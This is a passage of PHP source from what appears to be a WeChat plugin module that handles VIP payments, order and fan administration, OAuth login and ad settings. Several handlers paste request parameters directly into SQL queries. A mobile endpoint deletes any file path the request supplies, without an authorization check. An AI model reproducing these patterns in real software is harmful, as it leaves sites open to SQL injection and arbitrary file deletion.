        $params['user'] = $order['from_user'];
        $params['fee'] = $order['totalprice'];
        $params['title'] = $_W['account']['name'];
        $params['ordersn'] = $order['ordersn'];
        $params['virtual'] = false;
        include $this->template('pay');
    }

    public function payResult($params)
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $orderid = $params['tid'];
        $fee = intval($params['fee']);
        $data = array('status' => $params['result'] == 'success' ? 1 : 0);
        $paytype = array('credit' => '1', 'wechat' => '2', 'alipay' => '2', 'delivery' => '3');

        // 卡券代金券备注
        if (!empty($params['is_usecard'])) {
            $cardType = array('1' => '微信卡券', '2' => '系统代金券');
            $result_price = ($params['fee'] - $params['card_fee']);
            $data['paydetail'] = '使用' . $cardType[$params['card_type']] . '支付了' . $result_price;
            $data['paydetail'] .= '元，实际支付了' . $params['card_fee'] . '元。';
            $data['totalprice'] = $params['card_fee'];
        }

        $data['paytype'] = $paytype[$params['type']];

        if ($params['type'] == 'wechat') {
            $data['transid'] = $params['tag']['transaction_id'];
        }

        $order = pdo_fetch("SELECT * FROM " . tablename($this->table_order) . " WHERE id = :id", array(':id' => $orderid));
        if (empty($order)) {
            message('订单不存在!');
        }

        if ($params['result'] == 'success' && $params['from'] == 'notify') {
            if (!empty($order)) {
                pdo_update($this->table_order, $data, array('id' => $orderid));
                if ($order['status'] == 0) {
                    $order = pdo_fetch("SELECT * FROM " . tablename($this->table_order) . " WHERE id = :id", array(':id' => $orderid));
                    $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE id = :id", array(':id' => $order['fansid']));
                    $setting = pdo_fetch("SELECT * FROM " . tablename($this->table_setting) . " WHERE uniacid = :uniacid", array(':uniacid' => $order['uniacid']));
                    //判断时间
                    if ($fans['endtime'] > TIMESTAMP) {
                        if ($setting['viptype'] == 2) {
                            $vipcount = intval($order['vipcount']);
                            $time = strtotime('+' . $vipcount . ' month', $fans['endtime']);
                        } else {
                            $time = strtotime('+1 years', $fans['endtime']);
                        }
                    } else {
                        if ($setting['viptype'] == 2) {
                            $vipcount = intval($order['vipcount']);
                            $time = strtotime('+' . $vipcount . ' month');
                        } else {
                            $time = strtotime('+1 years');
                        }
                    }
                    pdo_update($this->table_fans, array('endtime' => $time, 'is_vip' => 1), array('id' => $fans['id']));


//                    if ($fans['is_vip'] == 1) { //vip用户
//
//                    } else { //普通用户
//                        $time = strtotime('+1 years');
//                        pdo_update($this->table_fans, array('endtime' => $time, 'is_vip' => 1), array('id' => $fans['id']));
//                    }
                    pdo_update($this->table_order, array('status' => 1), array('id' => $orderid));
                }
            }
        }

        $setting = uni_setting($_W['uniacid'], array('creditbehaviors'));
        $credit = $setting['creditbehaviors']['currency'];
        if ($params['type'] == $credit) {
            message('支付成功！', $this->createMobileUrl('index', array(), true), 'success');
        } else {
            message('支付成功！', '../../app/' . $this->createMobileUrl('index', array(), true), 'success');
        }
    }

    public function doWebSetOrderStatus()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $orderid = intval($_GPC['id']);
        $order = pdo_fetch("SELECT * FROM " . tablename($this->table_order) . " WHERE id = :id AND uniacid=:uniacid
        ", array(':id' => $orderid, ':uniacid' => $uniacid));
        if (empty($order)) {
            message('订单不存在！', '', 'error');
        }
        $setting = $this->getSetting();
        $fansid = $order['fansid'];

//        $sn = pdo_fetch("SELECT * FROM " . tablename('weisrc_quickad_sn') . " WHERE status=0 AND uniacid=:uniacid LIMIT 1", array(':uniacid' => $uniacid));
//        if (empty($sn)) {
//            message('已经没有充值码，请向代理商购买！', '', 'error');
//        }
        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE id = :id AND uniacid = :uniacid LIMIT 1", array(':id' =>
            $fansid, ':uniacid' => $uniacid));
        if (empty($fans)) {
            message('粉丝不存在！', '', 'error');
        }

        //判断时间
        if ($fans['endtime'] > TIMESTAMP) {
            if ($setting['viptype'] == 2) {
                $vipcount = intval($order['vipcount']);
                $time = strtotime('+' . $vipcount . ' month', $fans['endtime']);
            } else {
                $time = strtotime('+1 years', $fans['endtime']);
            }
        } else {
            if ($setting['viptype'] == 2) {
                $vipcount = intval($order['vipcount']);
                $time = strtotime('+' . $vipcount . ' month');
            } else {
                $time = strtotime('+1 years');
            }
        }
        pdo_update($this->table_fans, array('endtime' => $time, 'is_vip' => 1), array('id' => $fansid));

//        if ($fans['is_vip'] == 1) { //vip用户
//
//        } else { //普通用户
//            $time = strtotime('+1 years');
//            pdo_update($this->table_fans, array('endtime' => $time, 'is_vip' => 1), array('id' => $fansid));
//        }
        pdo_update($this->table_order, array('status' => 1), array('id' => $orderid));
//        pdo_update('weisrc_quickad_sn', array('status' => 1, 'fansid' => $fansid), array('id' => $sn['id']));
        message('操作成功！', $this->createWebUrl('order', array('op' => 'display')), 'success');
    }

    public function doWebSetUserVip()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $fansid = intval($_GPC['fansid']);

//        $sn = pdo_fetch("SELECT * FROM " . tablename('weisrc_quickad_sn') . " WHERE status=0 AND uniacid=:uniacid LIMIT 1", array(':uniacid' => $uniacid));
//        if (empty($sn)) {
//            message('已经没有充值码，请向代理商购买！', '', 'error');
//        }
        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE id = :id AND uniacid = :uniacid LIMIT 1", array(':id' =>
            $fansid, ':uniacid' => $uniacid));
        if (empty($fans)) {
            message('粉丝不存在！', '', 'error');
        }

        if ($fans['is_vip'] == 1) { //vip用户
            //判断时间
            if ($fans['endtime'] > TIMESTAMP) {
                $time = strtotime('+1 years', $fans['endtime']);
            } else {
                $time = strtotime('+1 years');
            }
            pdo_update($this->table_fans, array('endtime' => $time, 'is_vip' => 1), array('id' => $fansid));
        } else { //普通用户
            $time = strtotime('+1 years');
            pdo_update($this->table_fans, array('endtime' => $time, 'is_vip' => 1), array('id' => $fansid));
        }
//        pdo_update('weisrc_quickad_sn', array('status' => 1, 'fansid' => $fansid), array('id' => $sn['id']));
        message('操作成功！', $this->createWebUrl('fans', array('op' => 'display')), 'success');

//        $order = pdo_fetch("SELECT * FROM " . tablename($this->table_order) . " WHERE id = :id", array(':id' => $orderid));
//        $fans = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE id = :id", array(':id' => $order['fansid']));
//        if ($fans['is_vip'] == 1) { //vip用户
//            //判断时间
//            if ($fans['endtime'] > TIMESTAMP) {
//                $time = strtotime('+1 years', $fans['endtime']);
//            } else {
//                $time = strtotime('+1 years');
//            }
//            pdo_update($this->table_fans, array('endtime' => $time, 'is_vip' => 1), array('id' => $fans['id']));
//        } else { //普通用户
//            $time = strtotime('+1 years');
//            pdo_update($this->table_fans, array('endtime' => $time, 'is_vip' => 1), array('id' => $fans['id']));
//        }
//        pdo_update($this->table_order, array('status' => 1), array('id' => $orderid));
//        $sn = pdo_fetch("SELECT * FROM " . tablename('weisrc_quickad_sn') . " WHERE status=0 AND uniacid=:uniacid LIMIT 1", array(':uniacid' => $order['uniacid']));
//        pdo_update('weisrc_quickad_sn', array('status' => 1, 'fansid' => $order['fansid']), array('id' =>
//            $sn['id']));
    }

    public $actions_titles = array(
        'fans' => '用户管理',
        'order' => '交易记录',
        'help' => '使用教程',
        'style' => '样式设置',
        'ad' => '广告设置',
        'setting' => '系统设置',
    );

    public function checkModule($name)
    {
        $module = pdo_fetch("SELECT * FROM " . tablename("modules") . " WHERE name=:name ", array(':name' => $name));
        return $module;
    }

    //提示信息
    public function showMessageAjax($msg, $code = 0)
    {
        $result['code'] = $code;
        $result['msg'] = $msg;
        message($result, '', 'ajax');
    }

    public function  doMobileAjaxdelete()
    {
        global $_GPC;
        $delurl = $_GPC['pic'];
        load()->func('file');
        if (file_delete($delurl)) {
            echo 1;
        } else {
            echo 0;
        }
    }

    function img_url($img = '')
    {
        global $_W;
        if (empty($img)) {
            return "";
        }
        if (substr($img, 0, 6) == 'avatar') {
            return $_W['siteroot'] . "resource/image/avatar/" . $img;
        }
        if (substr($img, 0, 8) == './themes') {
            return $_W['siteroot'] . $img;
        }
        if (substr($img, 0, 1) == '.') {
            return $_W['siteroot'] . substr($img, 2);
        }
        if (substr($img, 0, 5) == 'http:') {
            return $img;
        }
        return $_W['attachurl'] . $img;
    }

    public function showMsg($msg, $status = 0)
    {
        $result = array('msg' => $msg, 'status' => $status);
        echo json_encode($result);
        exit();
    }

    private $version = '';

    public function doMobileVersion()
    {
        message($this->version);
    }

    public function oauth2($url)
    {
        global $_GPC, $_W;
        load()->func('communication');
        $code = $_GPC['code'];
        if (empty($code)) {
            message('code获取失败.');
        }
        $token = $this->getAuthorizationCode($code);
        $from_user = $token['openid'];
        $userinfo = $this->getUserInfo($from_user);
        $sub = 1;
        if ($userinfo['subscribe'] == 0) {
            //未关注用户通过网页授权access_token
            $sub = 0;
            $authkey = intval($_GPC['authkey']);
            if ($authkey == 0) {
                $oauth2_code = "https://open.weixin.qq.com/connect/oauth2/authorize?appid=" . $this->_appid . "&redirect_uri=" . urlencode($url) . "&response_type=code&scope=snsapi_userinfo&state=0#wechat_redirect";
                header("location:$oauth2_code");
            }
            $userinfo = $this->getUserInfo($from_user, $token['access_token']);
        }

        if (empty($userinfo) || !is_array($userinfo) || empty($userinfo['openid']) || empty($userinfo['nickname'])) {
            echo '<h1>获取微信公众号授权失败[无法取得userinfo], 请稍后重试！ 公众平台返回原始数据为: <br />' . $sub . $userinfo['meta'] . '<h1>';
            exit;
        }

        //设置cookie信息
        setcookie($this->_auth2_headimgurl, $userinfo['headimgurl'], time() + 3600 * 24);
        setcookie($this->_auth2_nickname, $userinfo['nickname'], time() + 3600 * 24);
        setcookie($this->_auth2_openid, $from_user, time() + 3600 * 24);
        setcookie($this->_auth2_sex, $userinfo['sex'], time() + 3600 * 24);
//        print_r($userinfo);
//        exit;
        return $userinfo;
    }

    public function getUserInfo($from_user, $ACCESS_TOKEN = '')
    {
        if ($ACCESS_TOKEN == '') {
            $ACCESS_TOKEN = $this->getAccessToken();
            $url = "https://api.weixin.qq.com/cgi-bin/user/info?access_token={$ACCESS_TOKEN}&openid={$from_user}&lang=zh_CN";
        } else {
            $url = "https://api.weixin.qq.com/sns/userinfo?access_token={$ACCESS_TOKEN}&openid={$from_user}&lang=zh_CN";
        }

        $json = ihttp_get($url);
        $userInfo = @json_decode($json['content'], true);
        return $userInfo;
    }

    public function getAuthorizationCode($code)
    {
        $oauth2_code = "https://api.weixin.qq.com/sns/oauth2/access_token?appid={$this->_appid}&secret={$this->_appsecret}&code={$code}&grant_type=authorization_code";
        $content = ihttp_get($oauth2_code);
        $token = @json_decode($content['content'], true);
        if (empty($token) || !is_array($token) || empty($token['access_token']) || empty($token['openid'])) {
            $oauth2_code = $this->createMobileUrl('waprestlist', array(), true);
            header("location:$oauth2_code");
//            echo '微信授权失败, 请稍后重试! 公众平台返回原始数据为: <br />' . $content['meta'] . '<h1>';
            exit;
        }
        return $token;
    }

    public function getAccessToken()
    {
        global $_W;
        $account = $_W['account'];
        if ($this->_accountlevel < 4) {
            if (!empty($this->_account)) {
                $account = $this->_account;
            }
        }
        load()->classs('weixin.account');
        $accObj = WeixinAccount::create($account['acid']);
        $access_token = $accObj->fetch_token();
        return $access_token;
    }

    public function getCode($url)
    {
        global $_W;
        $url = urlencode($url);
        $oauth2_code = "https://open.weixin.qq.com/connect/oauth2/authorize?appid={$this->_appid}&redirect_uri={$url}&response_type=code&scope=snsapi_base&state=0#wechat_redirect";
        header("location:$oauth2_code");
    }

    public function doWebSetting()
    {
        global $_GPC, $_W, $code;
        $code = $this->copyright;
        load()->func('tpl');
        $uniacid = $this->_uniacid;
        $action = 'setting';
        $title = $this->actions_titles[$action];

        $setting = pdo_fetch("SELECT * FROM " . tablename($this->table_setting) . " WHERE uniacid = :uniacid LIMIT 1", array(':uniacid' => $uniacid));
        if (checksubmit('submit')) {
            $data = array(
                'uniacid' => $_W['uniacid'],
                'title' => trim($_GPC['title']),
                'price' => floatval($_GPC['price']),
                'copyright' => trim($_GPC['copyright']),
                'share_title' => trim($_GPC['share_title']),
                'share_desc' => trim($_GPC['share_desc']),
                'share_image' => trim($_GPC['share_image']),
                'share_url' => trim($_GPC['share_url']),
                'dateline' => TIMESTAMP,

                'weixin' => trim($_GPC['weixin']),
                'viptype' => intval($_GPC['viptype']),
                'paytype' => intval($_GPC['paytype']),
                'read_min' => intval($_GPC['read_min']),
                'read_max' => intval($_GPC['read_max']),
                'praise_min' => intval($_GPC['praise_min']),
                'praise_max' => intval($_GPC['praise_max']),
                'show_qrcode' => intval($_GPC['show_qrcode']),
                'show_mobile' => intval($_GPC['show_mobile']),

                'taste_vip' => intval($_GPC['taste_vip']),
                'is_secondary_show' => intval($_GPC['is_secondary_show']),
                'price1' => floatval($_GPC['price1']),
                'price2' => floatval($_GPC['price2']),
                'price3' => floatval($_GPC['price3']),
                'price4' => floatval($_GPC['price4']),
            );

//            if (!isset($_COOKIE['miao_check'])) {
//                if (IMS_VERSION == '0.8') {
//                    load()->classs('cloudapi');
//                    $api = new CloudApi();
//                    $result = $api->get('site', 'module');
//                    if ($result) {
//                        if ($result['development'] != 1) {
//                            if ($result['trade'] != 1) {
//                                $data['price'] = 0.01;
//                                setcookie('miao_check', 'true', time() + 3600 * 10);
//                            }
//                        }
//                    } else {
//
//                    }
//                }
//
//            }

//            if ($setting['is_show_ad'] == 1) {
            $data['ad2_text'] = trim($_GPC['ad2_text']);
            $data['ad2'] = trim($_GPC['ad2']);
            $data['ad_url2'] = trim($_GPC['ad_url2']);
//            }

            if (empty($setting)) {
                pdo_insert($this->table_setting, $data);
            } else {
                unset($data['dateline']);
                pdo_update($this->table_setting, $data, array('uniacid' => $_W['uniacid']));
            }
            message('操作成功', $this->createWebUrl('setting'), 'success');
        }

        include $this->template('setting');
    }

    public function doWebStyle()
    {
        global $_W, $_GPC;
        load()->func('tpl');
        $uniacid = $this->_uniacid;
        $action = 'style';
        $title = $this->actions_titles[$action];

        $setting = pdo_fetch("SELECT * FROM " . tablename($this->table_setting) . " WHERE uniacid = :uniacid LIMIT 1", array(':uniacid' => $uniacid));

        if (checksubmit('submit')) {
            $data = array(
                'uniacid' => $_W['uniacid'],
                'btn_index' => trim($_GPC['btn_index']),
                'btn1' => trim($_GPC['btn1']),
                'btn2' => trim($_GPC['btn2']),
                'btn3' => trim($_GPC['btn3']),
                'btn4' => trim($_GPC['btn4']),
                'btn5' => trim($_GPC['btn5']),
                'btn_url1' => trim($_GPC['btn_url1']),
                'btn_url2' => trim($_GPC['btn_url2']),
                'btn_url3' => trim($_GPC['btn_url3']),
                'btn_url4' => trim($_GPC['btn_url4']),
                'btn_url5' => trim($_GPC['btn_url5'])
            );

            if (empty($setting)) {
                pdo_insert($this->table_setting, $data);
            } else {
                unset($data['dateline']);
                pdo_update($this->table_setting, $data, array('uniacid' => $_W['uniacid']));
            }
            message('操作成功', $this->createWebUrl('style'), 'success');
        }
        if (empty($setting)) {
            $setting = array(
                'btn1' => '一键转帖',
                'btn2' => '我的文章',
                'btn3' => '设置广告',
                'btn4' => '热门文章',
                'btn5' => '购买包年',
            );
        }

        include $this->template('style');
    }

    public function doWebHelp()
    {
        global $_W, $_GPC;
        load()->func('tpl');
        $uniacid = $this->_uniacid;
        $action = 'help';
        $title = $this->actions_titles[$action];

        $setting = pdo_fetch("SELECT * FROM " . tablename($this->table_setting) . " WHERE uniacid = :uniacid LIMIT 1", array(':uniacid' => $uniacid));
        if (checksubmit('submit')) {
            $data = array(
                'uniacid' => $_W['uniacid'],
                'help' => trim($_GPC['help'])
            );

            if (empty($setting)) {
                pdo_insert($this->table_setting, $data);
            } else {
                unset($data['dateline']);
                pdo_update($this->table_setting, $data, array('uniacid' => $_W['uniacid']));
            }
            message('操作成功', $this->createWebUrl('setting'), 'success');
        }

        include $this->template('help');
    }

    public function doWebad()
    {
        global $_W, $_GPC;
        load()->func('tpl');
        $uniacid = $this->_uniacid;
        $action = 'ad';
        $title = $this->actions_titles[$action];

        $setting = pdo_fetch("SELECT * FROM " . tablename($this->table_setting) . " WHERE uniacid = :uniacid LIMIT 1", array(':uniacid' => $uniacid));
        if (checksubmit('submit')) {
            $data = array(
                'uniacid' => $_W['uniacid'],
                'mobile' => trim($_GPC['mobile']),
                'title1' => trim($_GPC['title1']),
                'title2' => trim($_GPC['title2']),
                'qrcode' => trim($_GPC['qrcode']),
                'ad' => trim($_GPC['ad']),
                'admode' => intval($_GPC['admode']),
                'ad_url' => trim($_GPC['ad_url']),
            );

            if (empty($setting)) {
                pdo_insert($this->table_setting, $data);
            } else {
                unset($data['dateline']);
                pdo_update($this->table_setting, $data, array('uniacid' => $_W['uniacid']));
            }
            message('操作成功', $this->createWebUrl('ad'), 'success');
        }

        if (empty($setting)) {
            $setting = array(
                'title1' => '1秒把广告贴到朋友圈',
                'title2' => '最牛的朋友圈宣传工具'
            );
        }

        include $this->template('ad');
    }

    public function doWebSetProperty()
    {
        global $_GPC, $_W;
        $id = intval($_GPC['id']);
        $type = $_GPC['type'];
        $data = intval($_GPC['data']);
        empty($data) ? ($data = 1) : $data = 0;
        if (!in_array($type, array('is_show_ad', 'status', 'top'))) {
            die(json_encode(array("result" => 0)));
        }

        $setting = pdo_fetch("SELECT * FROM " . tablename($this->table_setting) . " WHERE uniacid = :uniacid LIMIT 1", array(':uniacid' => $id));
        $data_obj = array(
            'uniacid' => $id,
            'dateline' => TIMESTAMP,
            'is_show_ad' => $data
        );

        if (empty($setting)) {
            pdo_insert($this->table_setting, $data_obj);
        } else {
            unset($data['dateline']);
            pdo_update($this->table_setting, $data_obj, array('uniacid' => $id));
        }
        die(json_encode(array("result" => 1, "data" => $data)));
    }

    public function doWebSetPayProperty()
    {
        global $_GPC, $_W;
        $id = intval($_GPC['id']);
        $type = $_GPC['type'];
        $data = intval($_GPC['data']);
        empty($data) ? ($data = 1) : $data = 0;
        if (!in_array($type, array('is_pay'))) {
            die(json_encode(array("result" => 0)));
        }

        $setting = pdo_fetch("SELECT * FROM " . tablename($this->table_setting) . " WHERE uniacid = :uniacid LIMIT 1", array(':uniacid' => $id));
        $data_obj = array(
            'uniacid' => $id,
            'dateline' => TIMESTAMP,
            'is_pay' => $data
        );

        if (empty($setting)) {
            pdo_insert($this->table_setting, $data_obj);
        } else {
            unset($data['dateline']);
            pdo_update($this->table_setting, $data_obj, array('uniacid' => $id));
        }
        die(json_encode(array("result" => 1, "data" => $data)));
    }

    public function doWebAccount()
    {
        global $_GPC, $_W, $code;
        $code = $this->copyright;
        $action = 'account';
        $title = $this->actions_titles[$action];

        if (!$_W['isfounder']) {
            message('您没有该功能的操作权限！');
        }

        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        if ($operation == 'post') {
            $aweid = intval($_GPC['aweid']);
            if (checksubmit()) {
                $count = intval($_GPC['count']);
                for ($i = 0; $i < $count; $i++) {
                    $sn = random(11, 1);
                    $sn = $this->getNewSncode($sn);
                    $data = array(
                        'uniacid' => $aweid,
                        'sncode' => $sn,
                        'status' => 0,
                        'dateline' => TIMESTAMP
                    );

                    if (empty($item)) {
                        pdo_insert('weisrc_quickad_sn', $data);
                    }
                }
                $url = $this->createWebUrl('account', array('op' => 'display'));
                message('操作成功！', $url, 'success');
            }
        } else if ($operation == 'display') {
            $pindex = max(1, intval($_GPC['page']));
            $psize = 10;
            $strwhere = '';
            if (!empty($_GPC['keyword'])) {
                if ($_GPC['types'] == 'username') {
                    $list = pdo_fetchall("SELECT * FROM " . tablename('uni_account_users') . " WHERE uid in(SELECT uid FROM " . tablename('users') . " WHERE username=:username  ORDER BY uid DESC)", array(':username' => $_GPC['keyword']));
                } else if ($_GPC['types'] == 'mobile') {
                    $list = pdo_fetchall("SELECT * FROM " . tablename('uni_account_users') . " WHERE uid in(SELECT uid FROM " . tablename('users_profile') . " WHERE mobile
=:mobile ORDER BY uid DESC)", array(':mobile' => $_GPC['keyword']));
                }
            } else {
                $list = pdo_fetchall("SELECT * FROM " . tablename('uni_account_users') . " WHERE role<>'operator' ORDER BY id
                DESC LIMIT
" . ($pindex - 1) * $psize . ',' . $psize, array());
                if (!empty($list)) {
                    $total = pdo_fetchcolumn('SELECT COUNT(1) FROM ' . tablename('uni_account_users') . " WHERE role<>'operator' ", array());
                    $pager = pagination($total, $pindex, $psize);
                }
            }

            $users = pdo_fetchall("SELECT * FROM " . tablename('users') . " ORDER BY uid DESC", array(), "uid");
            $usersdetail = pdo_fetchall("SELECT * FROM " . tablename('users_profile') . " ORDER BY uid DESC", array(), "uid");
            $account_wechats = pdo_fetchall("SELECT * FROM " . tablename('account_wechats') . " ", array(), "uniacid");
            $settings = pdo_fetchall("SELECT * FROM " . tablename($this->table_setting) . " ", array(), "uniacid");
            $sn1 = pdo_fetchall("SELECT uniacid,COUNT(1) AS count FROM " . tablename('weisrc_quickad_sn') . " WHERE status=1 GROUP BY uniacid", array(), "uniacid");
            $sn2 = pdo_fetchall("SELECT uniacid,COUNT(1) AS count FROM " . tablename('weisrc_quickad_sn') . " GROUP BY uniacid", array(), "uniacid");
        } else if ($operation == 'displaysn') {
            $aweid = intval($_GPC['aweid']);
            $strwhere = '';
            $pindex = max(1, intval($_GPC['page']));
            $psize = 10;

            $fans = pdo_fetchall("SELECT * FROM " . tablename($this->table_fans) . " ORDER BY id DESC", array(), "id");

            $list = pdo_fetchall("SELECT * FROM " . tablename('weisrc_quickad_sn') . " WHERE uniacid = :uniacid ORDER BY id DESC LIMIT
" . ($pindex - 1) * $psize . ',' . $psize, array(':uniacid' => $aweid));
            if (!empty($list)) {
                $total = pdo_fetchcolumn('SELECT COUNT(1) FROM ' . tablename('weisrc_quickad_sn') . " WHERE uniacid = :uniacid ", array(':uniacid' => $aweid));
                $pager = pagination($total, $pindex, $psize);
            }
        } else if ($operation == 'deletesn') {
            $aweid = intval($_GPC['aweid']);
            $id = intval($_GPC['id']);
            $item = pdo_fetch("SELECT id FROM " . tablename('weisrc_quickad_sn') . " WHERE id = :id AND uniacid=:uniacid", array(':id' => $id, ':uniacid' => $aweid));
            if (empty($item)) {
                message('抱歉，不存在或是已经被删除！', $this->createWebUrl('account', array('op' => 'displaysn')), 'error');
            }
            pdo_delete('weisrc_quickad_sn', array('id' => $id, 'uniacid' => $aweid));
            message('删除成功！', $this->createWebUrl('account', array('op' => 'displaysn', 'aweid' => $aweid)), 'success');
        }
        include $this->template('account');
    }

    public function getNewSncode($sncode)
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        $sn = pdo_fetch("SELECT sncode FROM " . tablename('weisrc_quickad_sn') . " WHERE sncode = :sncode ORDER BY `id` DESC limit 1", array(':sncode' => $sncode));
        if (!empty($sn)) {
            $sncode = random(8, 1);
            $this->getNewSncode($sncode);
        }
        return $sncode;
    }

    public function doWebSetAdProperty()
    {
        global $_GPC, $_W;
        $id = intval($_GPC['id']);
        $type = $_GPC['type'];
        $data = intval($_GPC['data']);
        empty($data) ? ($data = 1) : $data = 0;
        if (!in_array($type, array('status'))) {
            die(json_encode(array("result" => 0)));
        }
        pdo_update($this->table_ad, array($type => $data), array("id" => $id, "uniacid" => $_W['uniacid']));
        die(json_encode(array("result" => 1, "data" => $data)));
    }

    public function doWebfans()
    {
        global $_GPC, $_W;
        load()->func('tpl');
        $uniacid = $this->_uniacid;
        $action = 'fans';
        $title = $this->actions_titles[$action];

        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        if ($operation == 'display') {
            $condition = '';
            if (!empty($_GPC['keyword'])) {
                $condition .= " AND (nickname LIKE '%{$_GPC['keyword']}%' OR id='{$_GPC['keyword']}') ";
            }
            if (isset($_GPC['status']) && $_GPC['status'] != '') {
                $condition .= " AND status={$_GPC['status']} ";
            }
            if (isset($_GPC['is_vip']) && $_GPC['is_vip'] == 1) {
                $condition .= " AND is_vip=1 AND endtime>" . TIMESTAMP . " ";
            }
            if (isset($_GPC['is_vip']) && $_GPC['is_vip'] == 3) {
                $condition .= " AND is_vip=1 AND endtime<" . TIMESTAMP . " ";
            }
            $pindex = max(1, intval($_GPC['page']));
            $psize = 8;

            $start = ($pindex - 1) * $psize;
            $limit = "";
            $limit .= " LIMIT {$start},{$psize}";
            $list = pdo_fetchall("SELECT * FROM " . tablename($this->table_fans) . " WHERE uniacid = :uniacid {$condition} ORDER BY id DESC " . $limit, array(':uniacid' => $uniacid), 'from_user');
            $total = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_fans) . " WHERE uniacid = :uniacid {$condition} ", array(':uniacid' => $uniacid));
            $vipcount = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_fans) . " WHERE uniacid = :uniacid AND is_vip=1 AND endtime>:time AND status=1 ", array(':uniacid' => $uniacid, ':time' => TIMESTAMP));
            $vipcount = intval($vipcount);
            $totalcount = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_fans) . " WHERE uniacid = :uniacid  ", array(':uniacid' => $uniacid));
            $article_count = pdo_fetchall("SELECT fansid,COUNT(1) as count FROM " . tablename($this->table_article) . "  GROUP BY fansid,uniacid having uniacid = :uniacid", array(':uniacid' => $this->_uniacid), 'fansid');
            $read_count = pdo_fetchall("SELECT fansid,sum(readcount) as count FROM " . tablename($this->table_article) . "  GROUP BY fansid,uniacid having uniacid =
:uniacid", array(':uniacid' => $this->_uniacid), 'fansid');
            $share_count = pdo_fetchall("SELECT fansid,sum(sharecount) as count FROM " . tablename($this->table_article) . "  GROUP BY fansid,uniacid having uniacid =
:uniacid", array(':uniacid' => $this->_uniacid), 'fansid');

            $vipcount2 = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_fans) . " WHERE uniacid = :uniacid AND is_vip=1 AND endtime<:time ", array(':uniacid' => $uniacid, ':time' => TIMESTAMP));

            $vipcount3 = pdo_fetchcolumn("SELECT count(1) FROM " . tablename($this->table_fans) . " WHERE uniacid = :uniacid AND status=0 ", array(':uniacid' => $uniacid));


            $pager = pagination($total, $pindex, $psize);
        } else if ($operation == 'post') {
            $id = intval($_GPC['id']);
            $item = pdo_fetch("SELECT * FROM " . tablename($this->table_fans) . " WHERE id = :id", array(':id' => $id));

            if (checksubmit()) {
                $data = array(
                    'uniacid' => $uniacid,
                    'nickname' => trim($_GPC['nickname']),
                    'username' => trim($_GPC['username']),
                    'mobile' => trim($_GPC['mobile']),
                    'title1' => trim($_GPC['title1']),
                    'title2' => trim($_GPC['title2']),
                    'headimgurl' => trim($_GPC['headimgurl']),
                    'qrcode' => trim($_GPC['qrcode']),
                    'ad' => trim($_GPC['ad']),
                    'ad_url' => trim($_GPC['ad_url']),
                    'status' => intval($_GPC['status']),
                    'dateline' => TIMESTAMP
                );

                if (empty($item)) {
                    pdo_insert($this->table_fans, $data);
                } else {
                    unset($data['dateline']);
                    if ($item['is_vip'] == 1) {
                        $data['endtime'] = strtotime($_GPC['datelimit']);
                    }

                    pdo_update($this->table_fans, $data, array('id' => $id, 'uniacid' => $uniacid));
                }
                message('操作成功！', $this->createWebUrl('fans', array('op' => 'display')), 'success');
            }
        } else if ($operation == 'delete') {
            $id = intval($_GPC['id']);
            $item = pdo_fetch("SELECT id FROM " . tablename($this->table_fans) . " WHERE id = :id AND uniacid=:uniacid", array(':id' => $id, ':uniacid' => $uniacid));
            if (empty($item)) {
                message('抱歉，不存在或是已经被删除！', $this->createWebUrl('fans', array('op' => 'display')), 'error');
            }
            pdo_delete($this->table_fans, array('id' => $id, 'uniacid' => $uniacid));
            message('删除成功！', $this->createWebUrl('fans', array('op' => 'display')), 'success');
        } else if ($operation == 'setstatus') {
            $id = intval($_GPC['id']);
            $status = intval($_GPC['status']);
            pdo_query("UPDATE " . tablename($this->table_fans) . " SET status = abs(:status - 1) WHERE id=:id", array(':status' => $status, ':id' => $id));
            message('操作成功！', referer(), 'success');
        }
        include $this->template('fans');
    }

    public function doWebOrder()
    {
        global $_W, $_GPC;
        $uniacid = $this->_uniacid;
        load()->func('tpl');
        $action = 'order';
        $title = $this->actions_titles[$action];

        $operation = !empty($_GPC['op']) ? $_GPC['op'] : 'display';
        if ($operation == 'display') {
            $pindex = max(1, intval($_GPC['page']));
            $psize = 10;

            $condition = '';
            if (!empty($_GPC['fansid'])) {
                $condition .= " AND fansid = '{$_GPC['fansid']}' ";
            }

            $list = pdo_fetchall("SELECT * FROM " . tablename($this->table_order) . " WHERE uniacid = :uniacid $condition ORDER BY id desc LIMIT
" . ($pindex - 1) * $psize . ',' . $psize, array(':uniacid' => $uniacid));

            $fans = pdo_fetchall("SELECT * FROM " . tablename($this->table_fans) . " WHERE uniacid = :uniacid ORDER BY id DESC ", array(':uniacid' => $uniacid), 'id');

            $total = pdo_fetchcolumn('SELECT COUNT(1) FROM ' . tablename($this->table_order) . " WHERE uniacid = :uniacid $condition", array(':uniacid' => $uniacid));
            $pager = pagination($total, $pindex, $psize);
        }
        include $this->template('order');
    }

    protected function exportexcel($data = array(), $title = array(), $filename = 'report')
    {
        header("Content-type:application/octet-stream");
        header("Accept-Ranges:bytes");
        header("Content-type:application/vnd.ms-excel");
        header("Content-Disposition:attachment;filename=" . $filename . ".xls");
        header("Pragma: no-cache");
        header("Expires: 0");
        //导出xls 开始
        if (!empty($title)) {
            foreach ($title as $k => $v) {
                $title[$k] = iconv("UTF-8", "GB2312", $v);
            }
            $title = implode("\t", $title);
            echo "$title\n";
        }
        if (!empty($data)) {
            foreach ($data as $key => $val) {
                foreach ($val as $ck => $cv) {
                    $data[$key][$ck] = iconv("UTF-8", "GB2312", $cv);
                }
                $data[$key] = implode("\t", $data[$key]);

            }
            echo implode("\n", $data);
        }
    }

    /*
    ** 设置切换导航
    */
    public function set_tabbar($action)
    {
        $actions_titles = $this->actions_titles;
